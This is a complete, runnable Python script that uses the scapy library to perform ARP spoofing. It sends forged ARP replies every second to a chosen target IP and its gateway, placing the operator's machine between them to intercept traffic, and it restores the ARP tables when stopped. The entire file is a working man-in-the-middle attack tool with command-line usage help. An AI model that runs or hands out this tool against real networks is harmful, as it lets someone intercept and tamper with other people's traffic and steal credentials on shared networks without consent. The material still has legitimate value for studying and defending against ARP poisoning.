#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys

# Help Function...
def help():
	print('Syntax:')
	program_name = str(sys.argv[0])
	print('\t' + program_name +' <target IP>')
	print('\t' + program_name +' <target IP> <Router IP>')
	print('Example IP: 192.168.12.154')
	exit()

def isCorrectIP(ip):
	ip = str(ip)
	ip_array = ip.split('.')
	if len(ip_array) == 4 :
		for i in range(4):
			if ip_array[i].isnumeric() :
				if(int(ip_array[i]) > 1 and int(ip_array[i]) < 255):
					continue
			else:
				return False
	else:
		return False

	return True


# Function for getting MAC address.
def getMAC(ip):
	try:
		# Creating arp request...
		arp_request = scapy.ARP(pdst=ip)

		# Creating ethernet frame for setting destination MAC....
		broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

		# Combining both packets...
		arp_request_broadcast = broadcast / arp_request

		# Sending and receiving requests...
		answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

		# Returning the MAC of given IP...
		return answered_list[0][1].hwsrc

	except IndexError:
		print("[-] IP is not in range, Unable to connect " + ip)
		exit()


# Function for sending ARP spoof packets.
def spoof(ip_dst, ip_src):
	# Getting MAC address of destination target...
	mac = getMAC(ip_dst)

	# Initiaizing a packet to send to the target IP saying that we are the given ip_src...
	packet = scapy.ARP(op=2, pdst=ip_dst, hwdst=mac, psrc=ip_src)

	# Sending the packet...
	scapy.send(packet, verbose=False)

	# Returning True after sending the packet...
	return True


# Function to restore the ARP spoof to default ARP table.
def restore(ip_dst, ip_src):
	# Getting MAC address of Destination target...
	mac = getMAC(ip_dst)

	# Getting MAC address of Source target...
	mac_gateway = getMAC(ip_src)

	# Initiaizing a packet to send to the target IP saying that we have MAC of the given ip_src...
	packet = scapy.ARP(op=1, pdst=ip_dst, hwdst=mac, psrc=ip_src, hwsrc=mac_gateway)

	# Sending the packet...
	scapy.send(packet, verbose=False)
	return "[-] ARP Table Restored for " + ip_dst + "."



# Main program...
packet_count = 0

args = len(sys.argv)

# Checking Arguments
if args == 2 :
	ip_target = str(sys.argv[1])
	if not isCorrectIP(ip_target):
		print('[-] Invalid IP Address')
		print('[-] Number of arguments: 1')
		help()

	ip_gateway = ip_target.split('.')
	ip_gateway[3] = '1'
	ip_gateway = '.'.join(ip_gateway)

elif args == 3 :
	ip_target = str(sys.argv[1])
	ip_gateway = str(sys.argv[2])
	if not isCorrectIP(ip_target) or not isCorrectIP(ip_gateway):
		print('[-] Invalid IP Address')
		print('[-] Number of arguments: 2')
		help()


else:
	print('[-] Invalid Syntax.')
	print('[-] Number of arguments: ' + str(args-1))
	help()


# Sending ARP packets...
try:
	print("[+] Sending Packets to " + ip_target)
	print("[+] Sending Packets to " + ip_gateway)

	while True:
		# Sending ARP packets to router and target ip.
		sp_target = spoof(ip_target, ip_gateway)
		sp_gateway = spoof(ip_gateway, ip_target)

		# Sleeping for 1 second.
		time.sleep(1)

		if sp_target and sp_gateway :
			packet_count+=1
			txt_sent = "[+] " + str(packet_count) + " Packets Sent."
			print('\r' + txt_sent, end='')


except KeyboardInterrupt:
	print('\n')
	print("[-] ARP reset initiated.")

	# Restoring the ARP table.
	rs_target = restore(ip_target, ip_gateway)
	rs_gateway = restore(ip_gateway, ip_target)

	print(rs_target + '\n' + rs_gateway)
	print("[-] Total Packets sent: " + str(packet_count))




